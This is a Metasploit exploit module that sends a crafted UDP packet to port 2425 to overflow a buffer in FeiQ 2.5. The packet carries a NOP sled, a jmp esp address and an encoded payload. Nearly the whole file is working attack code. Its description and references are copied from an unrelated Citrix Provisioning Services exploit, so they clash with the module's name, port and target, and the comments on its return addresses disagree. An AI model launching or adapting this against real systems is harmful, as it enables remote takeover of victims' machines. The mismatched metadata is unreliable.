require 'msf/core'
class Metasploit3 < Msf::Exploit::Remote
	Rank = NormalRanking

	include Msf::Exploit::Remote::Udp
	include Msf::Exploit::Remote::Seh
	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'feiq 2.5 Buffer Overflow',
			'Description'    => %q{
				This module exploits a remote buffer overflow in the Citrix Provisioning Services
				5.6 SP1 (without Hotfix CPVS56SP1E043) by sending a malformed packet to the
				6905/UDP port.  The module has been successfully tested on Windows Server 2003 SP2,
				Windows 7, and Windows XP SP3.
			},
			'License'        => MSF_LICENSE,
			'Author'         =>
				[
					'AbdulAziz Hariri',             # Initial discovery via ZDI
					'alino <26alino[at]gmail.com>'  # Metasploit module
				],
			'Version'        => '$Revision: $',
			'References'     =>
				[
					['BID', '49803'],
					['URL', 'http://www.zerodayinitiative.com/advisories/ZDI-12-009'],
					['URL', 'http://support.citrix.com/article/CTX130846']
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process',
					'InitialAutoRunScript' => 'migrate -f',
				},
			'Payload'        =>
				{
					
				},
			'Platform'       => ['win'],
			'Targets'        =>
				[
					[ 'win7',
						{
							'Offset' => 0,
							'Ret'    => 0x0050511e # ADD ESP,664; RETN 04 streamprocess.exe
						}
					]
				],
			'Privileged'     => 0,
			'DisclosureDate' => '',  
			'DefaultTarget'  => 0))

		register_options([Opt::RPORT(2425)], self.class)
	end

def exploit
	connect_udp
	
	print_status("Trying target #{target.name}...")
	
	header = "1_lbt4_1#65664#6CF04987CC1A#570#31741#2147483648#2.5a:1317316152:admin:XXCCLI-A10D5C26:0:"
	jmp_esp = "\x12\x45\xfa\x7f" #0x7FFA4512 jmp esp
	target_ret="\x1e\x51\x50\x00" #0x0050511e #{pivot 1484} # POP EBX # MOV DWORD PTR FS:[0],ECX # ADD ESP,5C8 # RETN
	padding="0"
	packet = "\x90"*7474
	packet[0,header.length] = header
	packet[408,8] = jmp_esp
	packet[408+8+8,payload.encoded.length] = payload.encoded
	packet << padding
	packet << [target.ret].pack('V')
	packet << [target.ret].pack('V')
	print_status("Trying target #{target.name}...")
	udp_sock.put(packet)
	handler
	disconnect_udp
end
end